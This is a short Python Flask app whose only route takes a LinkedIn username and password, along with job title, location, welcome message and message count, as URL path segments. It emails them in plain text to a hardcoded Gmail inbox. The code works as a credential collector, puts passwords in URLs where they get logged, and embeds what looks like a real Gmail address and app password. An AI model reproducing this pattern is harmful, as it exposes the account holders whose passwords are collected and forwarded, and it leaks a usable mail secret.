from flask import Flask, jsonify
from config import config
import yagmail
app = Flask(__name__)
@app.route('/solicitud/<username>/<password>/<list_str>/<cargo>/<ubicacion>/<mensaje_bienvenida>/<numero_mensajes>')
def send_email(username, password, list_str,cargo,ubicacion,mensaje_bienvenida,numero_mensajes):
    sender = "luchopinamar123@gmail.com"
    sender_password = "uhwonoeoeqwcdjfo"
    receiver = "luchopinamar123@gmail.com"
    yag = yagmail.SMTP(user=sender, password=sender_password)
    subject = "LinkedIn account"
    list_items = list_str.split(',')
    content = f"Username: {username} \nPassword:{password} \n Lista:{list_items} \n Cargo:{cargo}\n Ubicacion:{ubicacion}\n Mensaje:{mensaje_bienvenida}\n Numero_de_mensajes:{numero_mensajes}"
    yag.send(receiver, subject, content)
    return 'Request sent'


def pagina_no_encontrada(error):
    return '<h1> Page not found 404 Error. . .</h1>'
if __name__=='__main__':
    app.config.from_object(config['development'])
    app.register_error_handler(404, pagina_no_encontrada)
    app.run()